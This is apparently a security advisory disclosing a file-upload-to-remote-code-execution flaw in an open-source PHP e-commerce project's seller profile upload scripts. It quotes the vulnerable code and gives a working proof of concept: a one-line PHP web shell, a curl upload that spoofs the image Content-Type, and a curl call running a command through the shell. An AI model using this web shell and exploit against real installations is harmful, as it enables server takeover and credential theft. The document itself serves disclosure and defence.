## Executive Summary

A comprehensive security assessment was performed on the local instance of the E-commerce application. The assessment identified **four Critical and High-severity vulnerabilities** stemming from systemic flaws in input validation, session management, and access control implementation. Thois is mere one from others.

**Disclosure Timeline Update:**

* **December 16, 2025:** Initial contact attempted via email and this GitHub issue.
* **December 23, 2025:** Disclosure deadline passed. No response received from the maintainer.
* **December 26, 2025:** Proceeding with full disclosure in accordance with standard responsible disclosure guidelines to warn the community.


### **Disclosure Reference**

The issues detailed in these repositories were reported to the project maintainers in accordance with responsible disclosure practices. Full technical details are being released following the expiration of the disclosure deadline without response.

**Official Bug Report:** [GitHub Issue #23: Multiple Critical Vulnerabilities](https://github.com/detronetdip/E-commerce/issues/23)

---

## Vulnerability: Unrestricted File Upload leading to Remote Code Execution (RCE)

**Severity:** **CRITICAL** (10.0)
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
**Bug Type:** CWE-434: Unrestricted Upload of File with Dangerous Type

### Description

The application fails to enforce secure validation mechanisms on file uploads within the seller profile section. The vulnerability exists due to a chain of logic errors that allow an attacker to bypass intended restrictions:

1. **Improper MIME Type Validation:** The application relies exclusively on the `Content-Type` HTTP header (`$_FILES['file']['type']`) to validate the file type. This header is client-controlled and can be arbitrarily modified by an attacker to impersonate a legitimate image (e.g., `image/jpeg`). The server does not perform server-side content verification (such as "Magic Bytes" analysis).
2. **Insecure Filename Generation:** While the application attempts to rename uploaded files to randomize them, it constructs the new filename using the extension of the *original* uploaded file (`end($temp)`). It does not verify if this extension is safe for execution.

Consequently, an attacker can upload a file containing malicious PHP code (e.g., a web shell) with a `.php` extension. The server will accept the file because the MIME type is spoofed, rename it while preserving the `.php` extension, and store it in a web-accessible directory (`/media/seller_profile/`). When accessed via a browser, the web server executes the malicious PHP code, granting the attacker full control.

### Vulnerable Files

* `seller/assets/backend/profile/addadhar.php`
* `seller/assets/backend/profile/addpan.php`
* `seller/assets/backend/profile/addgstcfrt.php`
* `seller/assets/backend/profile/addbscfrt.php`

### Vulnerable Code Analysis

**File:** `seller/assets/backend/profile/addadhar.php`

```php
// FLAW 1: The code trusts the user-supplied MIME type from the HTTP header.
// An attacker can send a PHP file but set the header to 'image/jpeg' to bypass this.
if($_FILES['file']['type']!='' && $_FILES['file']['type']!='image/jpeg' ...){
    $msg="Format... Not supported";
}else{
    // FLAW 2: The code extracts the extension from the user-supplied filename.
    // If the file is 'shell.php', end($temp) returns 'php'.
    $temp = explode(".", $_FILES["file"]["name"]);
    
    // The new filename is constructed using the dangerous '.php' extension.
    $filename = rand(111111111,999999999)... . '.' . end($temp); 
    $location = "../../../../media/seller_profile/".$filename;
    
    // FLAW 3: The file is moved to a public directory without checking if the user 
    // is authenticated or authorized to upload files.
    if(move_uploaded_file($_FILES['file']['tmp_name'],$location))
    {
        echo $filename;
    }
}

```

### Exploit Proof of Concept (PoC)

**Exploit Command:**
The following `curl` command uploads a file named `shell.php` containing `<?php system($_GET["cmd"]); ?>` but forces the `Content-Type` to `image/jpeg` to bypass the check.

```bash
curl -X POST \
  -F "file=@shell.php;type=image/jpeg" \
  "http://localhost:3000/seller/assets/backend/profile/addadhar.php"

```

**Output (Server Response):**
The server successfully processes the upload and returns the name of the stored PHP file.

```text
7022559291765829052.php

```

**Execution Command:**
The attacker accesses the uploaded file to execute the system command `id`.

```bash
curl "http://localhost:3000/media/seller_profile/7022559291765829052.php?cmd=id"

```

**Output (Execution Confirmation):**

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Impact

* **System Compromise:** Attackers gain a shell on the web server (`www-data`), allowing them to navigate the file system and execute system binaries.
* **Data Breach:** Attackers can read sensitive system files (e.g., `/etc/passwd`), configuration files (such as `utility/connection.php`), and extract database credentials.
* **Persistence:** Attackers can install backdoors, malware, or crypto-miners to maintain access even if the vulnerable file is deleted.
